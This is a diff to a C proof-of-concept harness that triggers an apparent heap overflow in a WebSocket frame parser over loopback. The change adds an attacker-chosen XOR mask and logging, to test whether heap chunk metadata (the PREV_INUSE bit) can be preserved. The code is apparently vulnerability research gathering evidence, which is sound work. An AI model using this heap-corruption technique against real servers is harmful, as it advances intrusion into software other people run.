@@ -83,6 +83,11 @@ typedef struct wsh_sws {
 #define MASK2 0x42u
 #define MASK3 0x43u
 
+/* Attacker-chosen 4-byte WebSocket mask. W3: override via SIA_MASK=hex8 to
+ * test whether an even mask[0] lets PREV_INUSE survive the XOR write. */
+static uint8_t g_mask[4] = { MASK0, MASK1, MASK2, MASK3 };
+static int g_w3 = 0;   /* set only when SIA_MASK is supplied; keeps canonical evidence byte-identical */
+
 static int g_srv_fd = -1;
 
 /* A real read(2) from an accepted loopback TCP socket, in the shape of the
@@ -157,7 +162,7 @@ static void build_frame(uint8_t *frame, size_t payload_len)
 {
     uint64_t be;
     size_t i;
-    const uint8_t mask[4] = { MASK0, MASK1, MASK2, MASK3 };
+    const uint8_t *mask = g_mask;
 
     frame[0] = 0x82;                    /* FIN | WSOC_BINARY */
     frame[1] = 0xFF;                    /* MASK | 127 (64-bit length) */
@@ -192,7 +197,7 @@ int main(int argc, char **argv)
         payload_len = 65544;
         do_victim = 1;
     }
-    const uint8_t mask[4] = { MASK0, MASK1, MASK2, MASK3 };
+    const uint8_t *mask = g_mask;
     wsh_t *wsh;
     ws_opcode_t oc = WSOC_CONTINUATION;
     uint8_t *data = NULL, *frame;
@@ -207,6 +212,21 @@ int main(int argc, char **argv)
     size_t k;
 #endif
 
+    {
+        const char *ms = getenv("SIA_MASK");
+        if (ms && strlen(ms) == 8) {
+            int b;
+            for (b = 0; b < 4; b++) {
+                unsigned v;
+                if (sscanf(ms + 2 * b, "%2x", &v) != 1) {
+                    fprintf(stderr, "MASK_PARSE_FAIL\n");
+                    return 2;
+                }
+                g_mask[b] = (uint8_t)v;
+                g_w3 = 1;
+            }
+        }
+    }
     frame = (uint8_t *)malloc(14 + payload_len);
     if (!frame) return 2;
     build_frame(frame, payload_len);
@@ -299,7 +319,11 @@ int main(int argc, char **argv)
             for (k = meta_off; k < meta_off + 8; k++) fprintf(stderr, "%02x", snap[k]);
             fprintf(stderr, " NEXT_SIZE_AFTER=");
             for (k = meta_off; k < meta_off + 8; k++) fprintf(stderr, "%02x", after[k]);
-            fprintf(stderr, "\n");
+            if (g_w3)
+                fprintf(stderr, " PREV_INUSE_BEFORE=%d PREV_INUSE_AFTER=%d\n",
+                        snap[meta_off] & 1u, after[meta_off] & 1u);
+            else
+                fprintf(stderr, "\n");
         }
 #if defined(PIN_FIXED)
         /* Fixed pin: +1 slot can make realloc move the buffer; the live
